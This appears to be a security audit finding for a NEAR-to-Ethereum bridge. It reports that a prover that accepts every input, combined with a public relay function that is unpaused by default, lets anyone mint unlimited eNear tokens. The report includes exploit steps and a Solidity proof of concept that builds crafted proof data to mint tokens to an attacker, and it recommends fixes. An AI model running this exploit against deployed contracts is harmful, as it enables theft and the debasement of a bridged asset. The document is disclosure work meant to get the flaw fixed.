### Title
`FakeProver.proveOutcome` Unconditionally Returns `true`, Enabling Unauthorized eNear Minting via `ENearProxy.finaliseNearToEthTransfer` — (File: `evm/src/eNear/contracts/FakeProver.sol`)

---

### Summary

`FakeProver.proveOutcome` returns `true` for every possible input, directly analogous to the ERC1820 bug where `canImplementInterfaceForAddress` returned the magic constant for all inputs. `ENearProxy.finaliseNearToEthTransfer` is a public relay function gated only by a pause flag that is initialized to `0` (unset). Because `eNearProxy` is the admin of the `eNear` contract and can bypass `eNear`'s own pause, any unprivileged caller can supply crafted `proofData` to mint an arbitrary quantity of eNear tokens to any address.

---

### Finding Description

**Root cause — `FakeProver` accepts every proof:**

`FakeProver.proveOutcome` ignores both arguments and unconditionally returns `true`:

```solidity
// evm/src/eNear/contracts/FakeProver.sol
function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
    return true;
}
``` [1](#0-0) 

This is the production prover wired into `ENearProxy` at initialization:

```solidity
prover = INearProver(_prover);  // _prover == FakeProver address
``` [2](#0-1) 

**Public entry point — `ENearProxy.finaliseNearToEthTransfer`:**

```solidity
function finaliseNearToEthTransfer(
    bytes memory proofData,
    uint64 proofBlockHeight
) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
    require(
        prover.proveOutcome(proofData, proofBlockHeight),
        "Proof should be valid"
    );
    eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
}
``` [3](#0-2) 

The only guard is `whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER)`. `PAUSED_LEGACY_FIN_TRANSFER = 1 << 0`.

**Default pause state is 0 (unpaused):**

`SelectivePausableUpgradable.__Pausable_init_unchained` explicitly sets `_pausedFlags = 0`:

```solidity
function __Pausable_init_unchained() internal onlyInitializing {
    SelectivePausableStorage storage $ = _getSelectivePausableStorage();
    $._pausedFlags = 0;
}
``` [4](#0-3) 

`ENearProxy.initialize` calls `__Pausable_init()` but never sets `PAUSED_LEGACY_FIN_TRANSFER`: [5](#0-4) 

**Admin bypass of `eNear`'s own pause:**

The README confirms `eNearProxy` is made the admin of `eNear` and that `eNear`'s `finaliseNearToEthTransfer` is paused for public callers. However, the admin of the `eNear` contract can call paused functions. Since `eNearProxy` is the admin, when it calls `eNear.finaliseNearToEthTransfer`, the pause on `eNear` is bypassed. Additionally, `eNear`'s own prover is replaced with `FakeProver`, so `eNear`'s internal proof check also passes unconditionally. [6](#0-5) 

**Exploit flow:**

1. Attacker crafts `proofData` encoding a recipient address and an arbitrary mint amount (matching the Borsh layout used by `eNear.finaliseNearToEthTransfer`).
2. Attacker calls `ENearProxy.finaliseNearToEthTransfer(craftedProofData, 0)`.
3. `whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER)` passes — flags are `0`.
4. `FakeProver.proveOutcome(craftedProofData, 0)` returns `true` — no validation.
5. `eNear.finaliseNearToEthTransfer(craftedProofData, 0)` executes with `eNearProxy` as caller (admin of `eNear`), bypassing `eNear`'s pause.
6. `eNear` calls its own prover (`FakeProver`) — returns `true`.
7. `eNear` mints the specified amount to the attacker's address.

---

### Impact Explanation

**Critical.** An unprivileged attacker can mint an unbounded quantity of eNear tokens to any address at zero cost. eNear is a live ERC-20 token representing bridged NEAR on Ethereum. Unlimited minting breaks the 1:1 collateralization invariant, allows the attacker to drain any liquidity pool or DEX holding eNear, and constitutes direct unauthorized minting of a bridged native asset.

---

### Likelihood Explanation

**High.** The entry point (`ENearProxy.finaliseNearToEthTransfer`) is a public `external` function. No privileged role, leaked key, or special condition is required. The only prerequisite is that `PAUSED_LEGACY_FIN_TRANSFER` has not been set — which is the default state after `initialize()`. Any attacker who observes the deployment before the admin calls `pauseAll()` can exploit this immediately. Even if the admin pauses promptly, the window exists at every upgrade or redeployment.

---

### Recommendation

1. **Remove `ENearProxy.finaliseNearToEthTransfer` entirely**, or restrict it to `onlyRole(MINTER_ROLE)` / `onlyRole(DEFAULT_ADMIN_ROLE)`. There is no legitimate reason for an unprivileged user to call a relay that uses a `FakeProver`.
2. **Set `PAUSED_LEGACY_FIN_TRANSFER` in `initialize()`** so the function is paused from the moment of deployment, eliminating the deployment-window race.
3. **Replace `FakeProver` with a prover that validates the caller** (e.g., only accepts calls from `eNearProxy` itself), so that even if the relay is somehow unpaused, arbitrary external callers cannot pass proof verification.

---

### Proof of Concept

```solidity
// Attacker EOA, no special role required.
// Assumes ENearProxy is deployed with FakeProver and PAUSED_LEGACY_FIN_TRANSFER == 0.

// Craft proofData that encodes: mint 1,000,000 eNear to attacker
bytes memory craftedProof = abi.encodePacked(
    new bytes(72),
    hex"01000000",
    uint256(999),          // receiptId (any unused value)
    new bytes(24),
    Borsh.swapBytes4(uint32(nearConnectorLen)),
    nearConnectorBytes,
    hex"022500000000",
    Borsh.swapBytes16(uint128(1_000_000e24)),  // amount
    attacker,              // recipient address (20 bytes)
    new bytes(280)
);

// Step 1: call the public relay — no role check, no real proof check
ENearProxy(proxyAddr).finaliseNearToEthTransfer(craftedProof, 0);

// Result: eNear.balanceOf(attacker) == 1_000_000e24
// FakeProver returned true, eNearProxy (admin) bypassed eNear's pause,
// eNear's own FakeProver returned true, tokens minted.
```

### Citations

**File:** evm/src/eNear/contracts/FakeProver.sol (L6-9)
```text
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;
    }
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L33-49)
```text
    function initialize(
        address _eNear,
        address _prover,
        bytes memory _nearConnector,
        uint256 _currentReceiptId,
        address _adminAddress
    ) public initializer {
        __UUPSUpgradeable_init();
        __AccessControl_init();
        __Pausable_init();
        eNear = IENear(_eNear);
        nearConnector = _nearConnector;
        currentReceiptId = _currentReceiptId;
        prover = INearProver(_prover);
        _grantRole(DEFAULT_ADMIN_ROLE, _adminAddress);
        _grantRole(PAUSABLE_ADMIN_ROLE, _msgSender());
    }
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L80-90)
```text
    function finaliseNearToEthTransfer(
        bytes memory proofData,
        uint64 proofBlockHeight
    ) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
        require(
            prover.proveOutcome(proofData, proofBlockHeight),
            "Proof should be valid"
        );

        eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
    }
```

**File:** evm/src/omni-bridge/contracts/SelectivePausableUpgradable.sol (L51-54)
```text
    function __Pausable_init_unchained() internal onlyInitializing {
        SelectivePausableStorage storage $ = _getSelectivePausableStorage();
        $._pausedFlags = 0;
    }
```

**File:** evm/src/eNear/README.md (L16-23)
```markdown
To solve this problem, we implemented `eNearProxy` with `mint` and `burn` functions. 
We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` 
that will successfully verify any proof. 
We will pause the `finaliseNearToEthTransfer` and `transferToNear` functions, 
and only `eNearProxy`, as the admin, will have the ability to call these functions.
For minting, the `eNearProxy` will call `finaliseNearToEthTransfer` on `eNear`, 
providing a fake proof with the necessary data on who and how much to mint. 
For burning, it will call the `transferToNear` function with a non-existent address on NEAR.
```
